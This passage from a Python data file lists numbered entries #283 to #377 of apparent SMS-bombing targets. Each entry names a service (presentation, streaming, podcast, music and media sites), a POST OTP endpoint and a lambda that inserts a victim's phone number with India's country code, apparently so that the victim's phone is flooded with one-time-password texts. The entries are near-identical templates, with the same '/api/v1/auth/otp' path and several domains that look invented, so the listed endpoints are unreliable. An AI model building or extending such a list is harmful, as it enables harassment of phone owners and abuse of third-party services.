    'url': 'https://prezi.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 284
{
    'name': 'SlideShare_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://slideshare.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 285
{
    'name': 'HaikuDeck_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://haikudeck.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 286
{
    'name': 'Emaze_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://emaze.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 287
{
    'name': 'Sway_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://sway.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 288
{
    'name': 'Visme_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://visme.co/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 289
{
    'name': 'Beautiful_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://beautiful.ai/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 290
{
    'name': 'Gamma_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://gamma.app/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 291
{
    'name': 'Tome_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://tome.app/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 292
{
    'name': 'Pitch_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://pitch.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 293
{
    'name': 'Zight_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://zight.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 294
{
    'name': 'Loom_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://loom.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 295
{
    'name': 'ScreenRec_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://screenrec.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 296
{
    'name': 'OBS_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://obsproject.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 297
{
    'name': 'Streamlabs_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://streamlabs.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 298
{
    'name': 'Restream_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://restream.io/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 299
{
    'name': 'StreamElements_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://streamelements.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 300
{
    'name': 'Nightbot_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://nightbot.tv/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 301
{
    'name': 'Mobcrush_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mobcrush.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 302
{
    'name': 'Bigo_Live_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bigo.tv/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 303
{
    'name': 'Mico_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mico.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 304
{
    'name': 'Azar_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.azar.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 305
{
    'name': 'Hago_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hago.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 306
{
    'name': 'Yalla_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.yalla.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 307
{
    'name': 'Chamet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.chamet.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 308
{
    'name': 'Lemo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lemo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 309
{
    'name': 'Tumile_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tumile.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 310
{
    'name': 'MeeLive_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meelive.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 311
{
    'name': 'StarMaker_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.starmaker.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 312
{
    'name': 'Smule_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smule.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 313
{
    'name': 'Starmaker_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.starmaker.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 314
{
    'name': 'Smule_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smule.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 315
{
    'name': 'Triller_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.triller.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 316
{
    'name': 'Likee_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.likee.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 317
{
    'name': 'Bigo_Live_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bigolive.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 318
{
    'name': 'Kuaishou_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kuaishou.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 319
{
    'name': 'Douyin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.douyin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 320
{
    'name': 'Helo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.helo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 321
{
    'name': 'Zili_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zili.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 322
{
    'name': 'Vigo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vigo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 323
{
    'name': 'Uplive_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.uplive.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 324
{
    'name': '17Live_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.17live.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 325
{
    'name': 'Pococha_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pococha.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 326
{
    'name': 'Bambuser_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bambuser.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 327
{
    'name': 'StreamYard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.streamyard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 328
{
    'name': 'Riverside_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.riverside.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 329
{
    'name': 'SquadCast_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.squadcast.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 330
{
    'name': 'Zencastr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zencastr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 331
{
    'name': 'Anchor_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.anchor.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 332
{
    'name': 'Spotify_For_Podcasters_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spotifypodcasters.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 333
{
    'name': 'Simplecast_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.simplecast.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 334
{
    'name': 'Podbean_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.podbean.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 335
{
    'name': 'Transistor_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.transistor.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 336
{
    'name': 'Castos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.castos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 337
{
    'name': 'RedCircle_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.redcircle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 338
{
    'name': 'Acast_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.acast.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 339
{
    'name': 'Megaphone_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.megaphone.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 340
{
    'name': 'Art19_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.art19.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 341
{
    'name': 'Libsyn_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.libsyn.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 342
{
    'name': 'Blubrry_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.blubrry.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 343
{
    'name': 'Soundcloud_Repost_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundcloudrepost.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 344
{
    'name': 'Mixcloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mixcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 345
{
    'name': 'Hearthis_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hearthis.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 346
{
    'name': 'Audiomack_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.audiomack.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 347
{
    'name': 'Bandcamp_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandcamp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 348
{
    'name': 'Soundtrap_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundtrap.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 349
{
    'name': 'BandLab_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandlab.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 350
{
    'name': 'Soundtrap_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundtrap.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 351
{
    'name': 'BandLab_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandlab.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 352
{
    'name': 'SoundCloud_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundcloud.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 353
{
    'name': 'Mixcloud_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mixcloud.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 354
{
    'name': 'Audiomack_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.audiomack.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 355
{
    'name': 'Bandcamp_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandcamp.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 356
{
    'name': 'Hearthis_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hearthis.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 357
{
    'name': 'SoundTrap_Pro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundtrappro.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 358
{
    'name': 'BandLab_Pro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandlabpro.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 359
{
    'name': 'Spotify_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spotifystudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 360
{
    'name': 'Apple_Podcast_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.applepodcaststudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 361
{
    'name': 'Google_Podcast_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.googlepodcaststudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 362
{
    'name': 'Amazon_Music_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.amazonmusicstudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 363
{
    'name': 'Tidal_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tidalstudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 364
{
    'name': 'Deezer_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.deezerstudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 365
{
    'name': 'YouTube_Music_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.youtubemusicstudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 366
{
    'name': 'Vevo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vevo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 367
{
    'name': 'MTV_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mtv.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 368
{
    'name': 'VH1_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vh1.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 369
{
    'name': 'Comedy_Central_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.comedycentral.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 370
{
    'name': 'Nickelodeon_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nickelodeon.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 371
{
    'name': 'Cartoon_Network_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cartoonnetwork.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 372
{
    'name': 'Pogo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pogo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 373
{
    'name': 'Discovery_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.discovery.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 374
{
    'name': 'National_Geographic_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nationalgeographic.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 375
{
    'name': 'BBC_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bbc.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 376
{
    'name': 'CNN_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cnn.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 377
{
    'name': 'Fox_News_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.foxnews.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
